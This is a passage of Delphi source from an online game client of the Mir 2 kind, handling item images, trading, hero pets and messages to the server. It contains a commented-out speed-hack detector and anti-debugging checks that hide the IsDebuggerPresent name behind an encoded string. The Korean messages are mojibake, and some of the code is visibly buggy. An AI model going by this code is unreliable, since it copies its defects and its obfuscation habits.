Procedure TfrmMain.CheckHackTimerTimer(Sender: TObject);
Const
  busy: boolean = FALSE;
  //var
  //   ahour, amin, asec, amsec: word;
  //   tcount, timertime: longword;
Begin
  (*   if busy then exit;
     busy := TRUE;
     DecodeTime (Time, ahour, amin, asec, amsec);
     timertime := amin * 1000 * 60 + asec * 1000 + amsec;
     tcount := GetTickCount;

     if BoCheckSpeedHackDisplay then begin
        DScreen.AddSysMsg (IntToStr(tcount - LatestClientTime2) + ' ' +
                           IntToStr(timertime - LatestClientTimerTime) + ' ' +
                           IntToStr(abs(tcount - LatestClientTime2) - abs(timertime - LatestClientTimerTime)));
                           // + ',  ' +
                           //IntToStr(tcount - FirstClientGetTime) + ' ' +
                           //IntToStr(timertime - FirstClientTimerTime) + ' ' +
                           //IntToStr(abs(tcount - FirstClientGetTime) - abs(timertime - FirstClientTimerTime)));
     end;

     if (tcount - LatestClientTime2) > (timertime - LatestClientTimerTime + 55) then begin
        //DScreen.AddSysMsg ('**' + IntToStr(tcount - LatestClientTime2) + ' ' + IntToStr(timertime - LatestClientTimerTime));
        Inc (TimeFakeDetectTimer);
        if TimeFakeDetectTimer > 3 then begin
           //矫埃 炼累...
           SendSpeedHackUser;
           FrmDlg.DMessageDlg ('秦欧 橇肺弊伐 荤侩磊肺 扁废 登菌嚼聪促.\' +
                               '捞矾茄 辆幅狼 橇肺弊伐阑 荤侩窍绰 巴篮 阂过捞哥,\' +
                               '拌沥 拘幅殿狼 力犁 炼摹啊 啊秦龙 荐 乐澜阑 舅妨靛赋聪促.\' +
                               '[巩狼] mir2master@wemade.com\' +
                               '橇肺弊伐阑 辆丰钦聪促.', [mbOk]);
  //         FrmMain.Close;
           frmSelMain.Close;
        end;
     end else
        TimeFakeDetectTimer := 0;

     if FirstClientTimerTime = 0 then begin
        FirstClientTimerTime := timertime;
        FirstClientGetTime := tcount;
     end else begin
        if (abs(timertime - LatestClientTimerTime) > 500) or
           (timertime < LatestClientTimerTime)
        then begin
           FirstClientTimerTime := timertime;
           FirstClientGetTime := tcount;
        end;
        if abs(abs(tcount - FirstClientGetTime) - abs(timertime - FirstClientTimerTime)) > 5000 then begin
           Inc (TimeFakeDetectSum);
           if TimeFakeDetectSum > 25 then begin
              //矫埃 炼累...
              SendSpeedHackUser;
              FrmDlg.DMessageDlg ('秦欧 橇肺弊伐 荤侩磊肺 扁废 登菌嚼聪促.\' +
                                  '捞矾茄 辆幅狼 橇肺弊伐阑 荤侩窍绰 巴篮 阂过捞哥,\' +
                                  '拌沥 拘幅殿狼 力犁 炼摹啊 啊秦龙 荐 乐澜阑 舅妨靛赋聪促.\' +
                                  '[巩狼] mir2master@wemade.com\' +
                                  '橇肺弊伐阑 辆丰钦聪促.', [mbOk]);
  //            FrmMain.Close;
              frmSelMain.Close;
           end;
        end else
           TimeFakeDetectSum := 0;
        //LatestClientTimerTime := timertime;
        LatestClientGetTime := tcount;
     end;
     LatestClientTimerTime := timertime;
     LatestClientTime2 := tcount;
     busy := FALSE;
  *)
End;

(**
const
   busy: boolean = FALSE;
var
   ahour, amin, asec, amsec: word;
   timertime, tcount: longword;
begin
   if busy then exit;
   busy := TRUE;
   DecodeTime (Time, ahour, amin, asec, amsec);
   timertime := amin * 1000 * 60 + asec * 1000 + amsec;
   tcount := GetTickCount;

   //DScreen.AddSysMsg (IntToStr(tcount - FirstClientGetTime) + ' ' +
   //                   IntToStr(timertime - FirstClientTimerTime) + ' ' +
   //                   IntToStr(abs(tcount - FirstClientGetTime) - abs(timertime - FirstClientTimerTime)));

   if FirstClientTimerTime = 0 then begin
      FirstClientTimerTime := timertime;
      FirstClientGetTime := tcount;
   end else begin
      if (abs(timertime - LatestClientTimerTime) > 2000) or
         (timertime < LatestClientGetTime)
      then begin
         FirstClientTimerTime := timertime;
         FirstClientGetTime := tcount;
      end;
      if abs(abs(tcount - FirstClientGetTime) - abs(timertime - FirstClientTimerTime)) > 2000 then begin
         Inc (TimeFakeDetectSum);
         if TimeFakeDetectSum > 10 then begin
            //矫埃 炼累...
            SendSpeedHackUser;
            FrmDlg.DMessageDlg ('秦欧 橇肺弊伐 荤侩磊肺 扁废 登菌嚼聪促.\' +
                                '捞矾茄 辆幅狼 橇肺弊伐阑 荤侩窍绰 巴篮 阂过捞哥,\' +
                                '拌沥 拘幅殿狼 力犁 炼摹啊 啊秦龙 荐 乐澜阑 舅妨靛赋聪促.\' +
                                '[巩狼] mir2master@wemade.com\' +
                                '橇肺弊伐阑 辆丰钦聪促.', [mbOk]);
//            FrmMain.Close;
            frmSelMain.Close;
         end;
      end else
         TimeFakeDetectSum := 0;
      LatestClientTimerTime := timertime;
      LatestClientGetTime := tcount;
   end;
   busy := FALSE;
Except //程序自动增加
  DebugOutStr('[Exception] TfrmMain.CheckHackTimerTimer'); //程序自动增加
End; //程序自动增加
end;
//**)
{$ENDREGION}
Procedure TfrmMain.ClientGetDealRemoteAddItem(body: String);
Var
  ci: TClientItem;
Begin
  Try //程序自动增加
    If body <> '' Then
    Begin
      DecodeBuffer(body, @ci, sizeof(TClientItem));
      AddDealRemoteItem(ci);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetDealRemoteAddItem');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetDealRemoteDelItem(body: String);
Var
  ci: TClientItem;
Begin
  Try //程序自动增加
    If body <> '' Then
    Begin
      DecodeBuffer(body, @ci, sizeof(TClientItem));
      DelDealRemoteItem(ci);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetDealRemoteDelItem');
    //程序自动增加
  End; //程序自动增加
End;

//添加对方挑战抵押物品
Procedure TfrmMain.ClientGetChallenegAddItem(body: String;nidx:Integer);
Var
  ci: TClientItem;
Begin
  Try
    If body <> '' Then
    Begin
      DecodeBuffer(body, @ci, sizeof(TClientItem));
      g_ChallengeItems[nidx]:=ci;
    End;
  Except
    DebugOutStr('[Exception] TfrmMain.ClientGetChallenegAddItem');
  End;
End;
//删除对方挑战抵押物品
procedure TfrmMain.ClientGetChallengeDelItem(body: String;nidx:Integer);
Var
  ci: TClientItem;
Begin
  Try
    If body <> '' Then
    Begin
      DecodeBuffer(body, @ci, sizeof(TClientItem));
      if (ci.S.Name=g_ChallengeItems[nidx].S.Name) and (ci.MakeIndex=g_ChallengeItems[nidx].MakeIndex) then
      g_ChallengeItems[nidx].S.Name:='';
    End;
  Except
    DebugOutStr('[Exception] TfrmMain.ClientGetChallengeDelItem');
  End;
End;
Procedure TfrmMain.ClientGetReadMiniMap(mapindex, mapindex2: integer);
Begin
  Try //程序自动增加
    If mapindex2 > 0 Then
    Begin
      g_boViewMiniMap := TRUE;
      g_nMiniMapIndex := mapindex2 - 1;
      FrmDlg.DMiniMapDlg.Visible := True;
    End
    Else If mapindex > 0 Then
    Begin
      g_boViewMiniMap := TRUE;
      g_nMiniMapIndex := mapindex - 1;
      FrmDlg.DMiniMapDlg.Visible := True;
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetReadMiniMap');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetChangeGuildName(body: String);
Var
  str: String;
Begin
  Try //程序自动增加
    str := GetValidStr3(body, g_sGuildName, ['/']);
    g_sGuildRankName := Trim(str);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetChangeGuildName');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetSendUserState(body: String);
Var
  UserState: TUserStateInfo;
Begin
  Try //程序自动增加
    DecodeBuffer(body, @UserState, SizeOf(TUserStateInfo));
    UserState.NameColor := GetRGB(UserState.NameColor);
    FrmDlg.OpenUserState(UserState);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetSendUserState');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendTimeTimerTimer(Sender: TObject);
//var
//   tcount: longword;
Begin
  Try //程序自动增加
    //   tcount := GetTickCount;
    //   SendClientMessage (CM_CLIENT_CHECKTIME, tcount, Loword(LatestClientGetTime), Hiword(LatestClientGetTime), 0);
    //   g_dwLastestClientGetTime := tcount;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendTimeTimerTimer'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.DrawEffectHum(nType, nX, nY: Integer);
Var
  Effect: TNormalDrawEffect;
  n14: TNormalDrawEffect;
  bo15: Boolean;
Begin
  Try //程序自动增加
    Effect := Nil;
    n14 := Nil;
    Case nType Of
      0:
        Begin
        End;
      1: Effect := TNormalDrawEffect.Create(nX, nY, GetMonEx(14 - 1), 410, 6,
          120, False);
      2: Effect := TNormalDrawEffect.Create(nX, nY, g_WMagic2Images, 670, 10,
          150, False);
      3:
        Begin
          Effect := TNormalDrawEffect.Create(nX, nY, g_WMagic2Images, 690, 10,
            150, False);
          PlaySound(48);
        End;
      4:
        Begin
          PlayScene.NewMagic(Nil, 70, 70, nX, nY, nX, nY, 0, mtThunder, False,
            30, bo15);
          PlaySound(8301);
        End;
      5:
        Begin
          PlayScene.NewMagic(Nil, 71, 71, nX, nY, nX, nY, 0, mtThunder, False,
            30, bo15);
          PlayScene.NewMagic(Nil, 72, 72, nX, nY, nX, nY, 0, mtThunder, False,
            30, bo15);
          PlaySound(8302);
        End;
      6:
        Begin
          PlayScene.NewMagic(Nil, 73, 73, nX, nY, nX, nY, 0, mtThunder, False,
            30, bo15);
          PlaySound(8207);
        End;
      7:
        Begin
          PlayScene.NewMagic(Nil, 74, 74, nX, nY, nX, nY, 0, mtThunder, False,
            30, bo15);
          PlaySound(8226);
        End;
    End;
    If Effect <> Nil Then
    Begin
      Effect.MagOwner := g_MySelf;
      PlayScene.m_EffectList.Add(Effect);
    End;
    If n14 <> Nil Then
    Begin
      Effect.MagOwner := g_MySelf;
      PlayScene.m_EffectList.Add(Effect);
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.DrawEffectHum'); //程序自动增加
  End; //程序自动增加
End;

Function IsDebugA(): Boolean;
Var
  isDebuggerPresent: Function: Boolean;
  DllModule: THandle;
Begin
  DllModule := LoadLibrary('kernel32.dll');
  isDebuggerPresent := GetProcAddress(DllModule,
    PChar(DecodeString('NSI@UREqUrYaXa=nUSIaWcL'))); //'IsDebuggerPresent'
  Result := isDebuggerPresent;
End;

Function IsDebug(): Boolean;
Var
  isDebuggerPresent: Function: Boolean;
  DllModule: THandle;
Begin
  DllModule := LoadLibrary('kernel32.dll');
  isDebuggerPresent := GetProcAddress(DllModule,
    PChar(DecodeString('NSI@UREqUrYaXa=nUSIaWcL'))); //'IsDebuggerPresent'
  Result := isDebuggerPresent;
End;

//2004/05/17

Procedure TfrmMain.SelectChr(sChrName: String);
Begin
  Try //程序自动增加
    PlayScene.EdChrNamet.Text := sChrName;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SelectChr'); //程序自动增加
  End; //程序自动增加
End;
//2004/05/17

{function TfrmMain.GetNpcImg(wAppr: Word; var WMImage: TWMImages): Boolean;
var
  I: Integer;
  FileName:String;
begin
  Result:=False;
  for I := 0 to NpcImageList.Count - 1 do begin
    WMImage:=TWMImages(NpcImageList.Items[I]);
    if WMImage.Appr = wAppr then begin
      Result:=True;
      exit;
    end;
  end;
  {FileName:=NpcImageDir + IntToStr(wAppr) + '.wil';
  if FileExists(FileName) then begin
    WMImage:=TWMImages.Create(nil);
    WMImage.FileName:=FileName;
    WMImage.LibType:=ltUseCache;
    WMImage.DDraw:=DXDraw.DDraw;
    WMImage.Appr:=wAppr;
    WMImage.Initialize;
    NpcImageList.Add(WMImage);
    Result:=True;
  end;
end;   }

Function TfrmMain.GetWStateImg(Idx: Integer; Var ax, ay: integer):
  TDirectDrawSurface;
Var
  i: Integer;
  FileName: String;
  FileIdx: Integer;
  WMImage: TWMImages;
Begin
  Result := Nil;
  If idx < 10000 Then
  Begin
    Result := g_WStateItemImages.GetCachedImage(idx, ax, ay);
    Exit;
  End;
  FileIdx := idx Div 10000;
  For i := 0 To ItemImageList.count - 1 Do
  Begin
    WMImage := TWMImages(ItemImageList.Items[i]);
    If WMImage.Appr = FileIdx Then
    Begin
      Result := WMImage.GetCachedImage(idx - FileIdx * 10000, ax, ay);
      Exit;
    End;
  End;
  FileName := Format(STATEITEMIMAGESFILE1, [FileIdx + 1]);
  If FileExists(FileName) Then
  Begin
    WMImage := TWMImages.Create(Nil);
    WMImage.FileName := FileName;
    WMImage.LibType := ltUseCache;
    WMImage.DDraw := DXDraw.DDraw;
    WMImage.Appr := FileIdx;
    WMImage.Initialize;
    ItemImageList.Add(WMImage);
    Result := WMImage.GetCachedImage(idx - FileIdx * 10000, ax, ay);
  End;
End;

Function TfrmMain.GetWStateImg(Idx: Integer): TDirectDrawSurface;
Var
  i: Integer;
  FileName: String;
  FileIdx: Integer;
  WMImage: TWMImages;
Begin
  Result := Nil;
  If idx < 10000 Then
  Begin
    Result := g_WStateItemImages.Images[idx];
    Exit;
  End;
  FileIdx := idx Div 10000;
  For i := 0 To ItemImageList.count - 1 Do
  Begin
    WMImage := TWMImages(ItemImageList.Items[i]);
    If WMImage.Appr = FileIdx Then
    Begin
      Result := WMImage.Images[idx - FileIdx * 10000]; //取物品所在IDX位置
      Exit;
    End;
  End;
  FileName := Format(STATEITEMIMAGESFILE1, [FileIdx + 1]);
  If FileExists(FileName) Then
  Begin
    WMImage := TWMImages.Create(Nil);
    WMImage.FileName := FileName;
    WMImage.LibType := ltUseCache;
    WMImage.DDraw := DXDraw.DDraw;
    WMImage.Appr := FileIdx;
    WMImage.Initialize;
    ItemImageList.Add(WMImage);
    Result := WMImage.Images[idx - FileIdx * 10000]; //取物品所在IDX位置
  End;
End;

Function TfrmMain.GetWDnItemImg(Idx: Integer): TDirectDrawSurface;
Var
  i: Integer;
  FileName: String;
  FileIdx: Integer;
  WMImage: TWMImages;
Begin
  Result := Nil;
  If idx < 10000 Then
  Begin
    Result := g_WDnItemImages.Images[idx];
    Exit;
  End;
  FileIdx := idx Div 10000;
  For i := 0 To DnItemImageList.count - 1 Do
  Begin
    WMImage := TWMImages(DnItemImageList.Items[i]);
    If WMImage.Appr = FileIdx Then
    Begin
      Result := WMImage.Images[idx - FileIdx * 10000]; //取物品所在IDX位置
      Exit;
    End;
  End;
  FileName := Format(DNITEMIMAGESFILE1, [FileIdx + 1]);
  If FileExists(FileName) Then
  Begin
    WMImage := TWMImages.Create(Nil);
    WMImage.FileName := FileName;
    WMImage.LibType := ltUseCache;
    WMImage.DDraw := DXDraw.DDraw;
    WMImage.Appr := FileIdx;
    WMImage.Initialize;
    DnItemImageList.Add(WMImage);
    Result := WMImage.Images[idx - FileIdx * 10000]; //取物品所在IDX位置
  End;
End;

Function TfrmMain.GetWMMapImg(Idx: Integer): TDirectDrawSurface;
Var
  i: Integer;
  FileName: String;
  FileIdx: Integer;
  WMImage: TWMImages;
Begin
  Result := Nil;
  If idx < 10000 Then
  Begin
    Result := g_WMMapImages.Images[idx];
    Exit;
  End;
  FileIdx := idx Div 10000;
  For i := 0 To MMapImageList.count - 1 Do
  Begin
    WMImage := TWMImages(MMapImageList.Items[i]);
    If WMImage.Appr = FileIdx Then
    Begin
      Result := WMImage.Images[idx - FileIdx * 10000]; //取物品所在IDX位置
      Exit;
    End;
  End;
  FileName := Format(MINMAPIMAGEFILE1, [FileIdx + 1]);
  If FileExists(FileName) Then
  Begin
    WMImage := TWMImages.Create(Nil);
    WMImage.FileName := FileName;
    WMImage.LibType := ltUseCache;
    WMImage.DDraw := DXDraw.DDraw;
    WMImage.Appr := FileIdx;
    WMImage.Initialize;
    MMapImageList.Add(WMImage);
    Result := WMImage.Images[idx - FileIdx * 10000]; //取物品所在IDX位置
  End;
End;

Function TfrmMain.GetWBagItemImg(Idx: Integer; Var ax, ay: integer):
  TDirectDrawSurface;
Var
  i: Integer;
  FileName: String;
  FileIdx: Integer;
  WMImage: TWMImages;
Begin
  Result := Nil;
  If idx < 10000 Then
  Begin
    Result := g_WBagItemImages.GetCachedImage(idx, ax, ay);
    Exit;
  End;
  FileIdx := idx Div 10000;
  For i := 0 To BagItemImageList.count - 1 Do
  Begin
    WMImage := TWMImages(BagItemImageList.Items[i]);
    If WMImage.Appr = FileIdx Then
    Begin
      Result := WMImage.GetCachedImage(idx - FileIdx * 10000, ax, ay);
      Exit;
    End;
  End;
  FileName := Format(BAGITEMIMAGESFILE1, [FileIdx + 1]);
  If FileExists(FileName) Then
  Begin
    WMImage := TWMImages.Create(Nil);
    WMImage.FileName := FileName;
    WMImage.LibType := ltUseCache;
    WMImage.DDraw := DXDraw.DDraw;
    WMImage.Appr := FileIdx;
    WMImage.Initialize;
    BagItemImageList.Add(WMImage);
    Result := WMImage.GetCachedImage(idx - FileIdx * 10000, ax, ay);
  End;
End;

Function TfrmMain.GetWBagItemImg(Idx: Integer): TDirectDrawSurface;
Var
  i: Integer;
  FileName: String;
  FileIdx: Integer;
  WMImage: TWMImages;
Begin
  Result := Nil;
  If idx < 10000 Then
  Begin
    Result := g_WBagItemImages.Images[idx];
    Exit;
  End;
  FileIdx := idx Div 10000;
  For i := 0 To BagItemImageList.count - 1 Do
  Begin
    WMImage := TWMImages(BagItemImageList.Items[i]);
    If WMImage.Appr = FileIdx Then
    Begin
      Result := WMImage.Images[idx - FileIdx * 10000]; //取物品所在IDX位置
      Exit;
    End;
  End;
  FileName := Format(BAGITEMIMAGESFILE1, [FileIdx + 1]);
  If FileExists(FileName) Then
  Begin
    WMImage := TWMImages.Create(Nil);
    WMImage.FileName := FileName;
    WMImage.LibType := ltUseCache;
    WMImage.DDraw := DXDraw.DDraw;
    WMImage.Appr := FileIdx;
    WMImage.Initialize;
    BagItemImageList.Add(WMImage);
    Result := WMImage.Images[idx - FileIdx * 10000]; //取物品所在IDX位置
  End;
End;

Function TfrmMain.GetWWeaponImg(Weapon, m_btSex, nFrame: Integer; Var ax, ay:
  integer): TDirectDrawSurface;
Var
  I: Integer;
  FileName: String;
  FileIdx, ImageIdx: Integer;
  WMImage: TWMImages;
Begin
  Result := Nil;

  If Weapon >= 220 Then
  Begin
    FileIdx := 4;
    ImageIdx := Weapon - 220;
  End
  Else If Weapon >= 180 Then
  Begin
    FileIdx := 3;
    ImageIdx := Weapon - 180;
  End
  Else If Weapon >= 140 Then
  Begin
    FileIdx := 2;
    ImageIdx := Weapon - 140;
  End
  Else If Weapon >= 100 Then
  Begin
    FileIdx := 1;
    ImageIdx := Weapon - 100;
  End
  Else
  Begin
    FileIdx := 0;
    ImageIdx := Weapon;
  End;

  //FileIdx:=Weapon div 200;
  //ImageIdx:=Weapon mod 200;
  If FileIdx = 0 Then
  Begin
    Result := g_WWeaponImages.GetCachedImage(HUMANFRAME * ImageIdx + nFrame, ax,
      ay);
  End
  Else
  Begin
    For I := 0 To WeaponImageList.Count - 1 Do
    Begin
      WMImage := TWMImages(WeaponImageList.Items[I]);
      If WMImage.Appr = FileIdx Then
      Begin
        Result := WMImage.GetCachedImage(HUMANFRAME * ImageIdx + nFrame, ax,
          ay);
        exit;
      End;
    End;
    FileName := Format(WEAPONIMAGESFILE1, [FileIdx + 1]);
    If FileExists(FileName) Then
    Begin
      WMImage := TWMImages.Create(Nil);
      WMImage.FileName := FileName;
      WMImage.LibType := ltUseCache;
      WMImage.DDraw := DXDraw.DDraw;
      WMImage.Appr := FileIdx;
      WMImage.Initialize;
      WeaponImageList.Add(WMImage);
      Result := WMImage.GetCachedImage(HUMANFRAME * ImageIdx + nFrame, ax, ay);
    End;
    If Result = Nil Then
    Begin
      Result := g_WWeaponImages.GetCachedImage(HUMANFRAME * Weapon + nFrame, ax,
        ay);
    End;
  End;

End;

Function TfrmMain.GetWHorseImg(Horse, nFrame: Integer; Var ax, ay: integer):
  TDirectDrawSurface;
Begin
  If Horse > 0 Then
    Result := g_HorseImages.GetCachedImage(HUMANFRAME * (Horse - 1) + nFrame,
      ax, ay)
  Else
    Result := Nil;
End;

Function TfrmMain.GetWHorseHumImg(Dress, m_btSex, nFrame: Integer; Var ax, ay:
  integer): TDirectDrawSurface;
Var
  nIdx: Integer;
Begin
  //  Result:=nil;
  If Dress > 1 Then
    nIdx := 2
  Else
    nIdx := 0;
  Result := g_HorseHumImages.GetCachedImage(HUMANFRAME * (nIdx + m_btSex) +
    nFrame, ax, ay);
  Dec(ay, 4);
End;

Function TfrmMain.GetWHumImg(Dress, m_btSex, nFrame: Integer; Var ax, ay:
  integer): TDirectDrawSurface;
Var
  I: Integer;
  FileName: String;
  FileIdx, ImageIdx: Integer;
  WMImage: TWMImages;
Begin
  Result := Nil;
  //FileIdx:=Dress div 200;
  //ImageIdx:=Dress mod 200;
  If Dress >= 220 Then
  Begin
    FileIdx := 4;
    ImageIdx := Dress - 220;
  End
  Else If Dress >= 180 Then
  Begin
    FileIdx := 3;
    ImageIdx := Dress - 180;
  End
  Else If Dress >= 140 Then
  Begin
    FileIdx := 2;
    ImageIdx := Dress - 140;
  End
  Else If Dress >= 100 Then
  Begin
    FileIdx := 1;
    ImageIdx := Dress - 100;
  End
  Else
  Begin
    FileIdx := 0;
    ImageIdx := Dress;
  End;
  If FileIdx = 0 Then
  Begin
    Result := g_WHumImgImages.GetCachedImage(HUMANFRAME * ImageIdx + nFrame, ax,
      ay);
  End
  Else
  Begin
    For I := 0 To HumImageList.Count - 1 Do
    Begin
      WMImage := TWMImages(HumImageList.Items[I]);
      If WMImage.Appr = FileIdx Then
      Begin
        Result := WMImage.GetCachedImage(HUMANFRAME * ImageIdx + nFrame, ax,
          ay);
        exit;
      End;
    End;
    FileName := Format(HUMIMGIMAGESFILE1, [FileIdx + 1]);
    If FileExists(FileName) Then
    Begin
      WMImage := TWMImages.Create(Nil);
      WMImage.FileName := FileName;
      WMImage.LibType := ltUseCache;
      WMImage.DDraw := DXDraw.DDraw;
      WMImage.Appr := FileIdx;
      WMImage.Initialize;
      HumImageList.Add(WMImage);
      Result := WMImage.GetCachedImage(HUMANFRAME * ImageIdx + nFrame, ax, ay);
    End;
    If Result = Nil Then
    Begin
      Result := g_WHumImgImages.GetCachedImage(HUMANFRAME * Dress + nFrame, ax,
        ay);
    End;
  End;

End;

Procedure TfrmMain.ClientGetNeedPassword(Body: String);
Begin
  Try //程序自动增加
    FrmDlg.DChgGamePwd.Visible := True;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetNeedPassword');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.ClientGetPasswordStatus(Msg: pTDefaultMessage;
  Body: String);
Begin
  Try //程序自动增加

  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ClientGetPasswordStatus');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendShopList(nIdent: Integer);
Var
  DefMsg: TDefaultMessage;
Begin
  Try //程序自动增加
    DefMsg := MakeDefaultMsg(CM_SHOPVIEW, nIdent, 0, 0, 0);
    SendSocket(EncodeMessage(DefMsg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendShopList'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendPlayDrink(Drink1, Drink2: Integer);
Var
  DefMsg: TDefaultMessage;
Begin
  DefMsg := MakeDefaultMsg(CM_PLAYDRINK, FrmDlg.m_PlayDrinkNpc, LoWord(Drink1),
    HiWord(Drink1), 0);
  SendSocket(EncodeMessage(DefMsg) + EncodeString(IntToStr(Drink2)));
End;

Procedure TfrmMain.SendShopSend(sItemName, UserName: String);
Var
  DefMsg: TDefaultMessage;
Begin
  DefMsg := MakeDefaultMsg(CM_SHOPSEND, 0, 0, 0, 0);
  SendSocket(EncodeMessage(DefMsg) + EncodeString(sItemName + #13 + UserName));
End;

Procedure TfrmMain.SendGetHero(HeroClass: Integer);
Var
  DefMsg: TDefaultMessage;
Begin
  DefMsg := MakeDefaultMsg(CM_GETHERO, HeroClass, 0, 0, 0);
  SendSocket(EncodeMessage(DefMsg));
End;

Procedure TfrmMain.SendShopLingfu(nCount: Integer);
Var
  DefMsg: TDefaultMessage;
Begin
  DefMsg := MakeDefaultMsg(CM_SHOPLINGFU, nCount, 0, 0, 0);
  SendSocket(EncodeMessage(DefMsg));
End;

Procedure TfrmMain.SendShopPay();
Var
  DefMsg: TDefaultMessage;
Begin
  DefMsg := MakeDefaultMsg(CM_SHOPPAY, 0, 0, 0, 0);
  SendSocket(EncodeMessage(DefMsg));
end;


Procedure TfrmMain.SendShopBuy(sItemName: String);
Var
  DefMsg: TDefaultMessage;
Begin
  Try //程序自动增加
    DefMsg := MakeDefaultMsg(CM_SHOPBUY, 0, 0, 0, 0);
    SendSocket(EncodeMessage(DefMsg) + EncodeString(sItemName));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendShopBuy'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendPassword(sPassword: String; nIdent: Integer);
Var
  DefMsg: TDefaultMessage;
Begin
  Try //程序自动增加
    DefMsg := MakeDefaultMsg(CM_PASSWORD, 0, nIdent, 0, 0);
    SendSocket(EncodeMessage(DefMsg) + EncodeString(sPassword));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendPassword'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendHeroMob();
Var
  DefMsg: TDefaultMessage;
Begin
  Try //程序自动增加
    DefMsg := MakeDefaultMsg(CM_1109,
      99,
      Integer(g_WgInfo.boHeroCallFairy),
      Integer(g_WgInfo.boHeroCallDogz),
      Integer(g_WgInfo.boHeroCallBoneFamm));
    SendSocket(EncodeMessage(DefMsg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendHeroMob'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendHeroFun(nOff, btClass: Word);
Var
  DefMsg: TDefaultMessage;
Begin
  Try //程序自动增加
    DefMsg := MakeDefaultMsg(CM_1107, nOff, btClass, 0, 0);
    SendSocket(EncodeMessage(DefMsg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendHeroFun'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendHeroMinHPTail(Hp:Integer);
Var
  DefMsg: TDefaultMessage;
Begin
  Try
    DefMsg := MakeDefaultMsg(CM_HeroMinHPTail,hp, 0, 0, 0);
    SendSocket(EncodeMessage(DefMsg));
  Except
    DebugOutStr('[Exception] TfrmMain.SendHeroMinHPTail');
  End;
end;

Procedure TfrmMain.SendHeroCall();
Var
  DefMsg: TDefaultMessage;
  Idx: Integer;
Begin
  Try //程序自动增加
    If g_HeronRecogId = 0 Then
      Idx := CM_MAKEHERO
    Else
      Idx := CM_GHOSTHERO;
    {  if OldSendId<>Idx then begin
        OldSendId:=Idx; }
    DefMsg := MakeDefaultMsg(Idx,0, 0, 0, 0);
    SendSocket(EncodeMessage(DefMsg));
    //  end;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendHeroCall'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendHeroItemToMasterBag(nIdx: Integer; sMsg: String);
Var
  DefMsg: TDefaultMessage;
Begin
  Try //程序自动增加
    DefMsg := MakeDefaultMsg(CM_1101, nIdx, 0, 0, 0);
    SendSocket(EncodeMessage(DefMsg) + EncodeString(sMsg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendHeroItemToMasterBag');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendMasterItemToHeroBag(nIdx: Integer; sMsg: String);
Var
  DefMsg: TDefaultMessage;
Begin
  Try //程序自动增加
    DefMsg := MakeDefaultMsg(CM_1100, nIdx, 0, 0, 0);
    SendSocket(EncodeMessage(DefMsg) + EncodeString(sMsg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendMasterItemToHeroBag');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendHeroTakeOnItem(where: byte; itmindex: integer; itmname:
  String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_1102, itmindex, where, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itmname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendHeroTakeOnItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendHeroIncFireDrakeHeartDander(itmindex: integer);
Var
  msg: TDefaultMessage;
Begin
  Try
    msg := MakeDefaultMsg(CM_IncFireDrakeHeartDander, itmindex,0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except
    DebugOutStr('[Exception] TfrmMain.SendHeroIncFireDrakeHeartDander');
  End;
End;

//泉水叠加到泉水罐 或药品叠加
Procedure TfrmMain.SendItemFold(Sourindex,Desindex:Integer;bHero:Byte);
Var
  msg: TDefaultMessage;
  itemsindex:TItemsFoldRec;
Begin
  Try
    msg := MakeDefaultMsg(CM_ITEMFOLD,Integer(bHero),0, 0, 0);
    itemsindex.SourMakeIndex:=Sourindex;
    itemsindex.DESMakeIndex:=Desindex;
    SendSocket(EncodeMessage(msg)+EncodeBuffer(@itemsindex,SizeOf(TItemsFoldRec)));
  Except
    DebugOutStr('[Exception] TfrmMain.SendItemFold');
  End;

end;

Procedure TfrmMain.SendHeroTakeOffItem(where: byte; itmindex: integer; itmname:
  String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_1103, itmindex, where, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itmname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendHeroTakeOffItem'); //程序自动增加
  End; //程序自动增加
End;

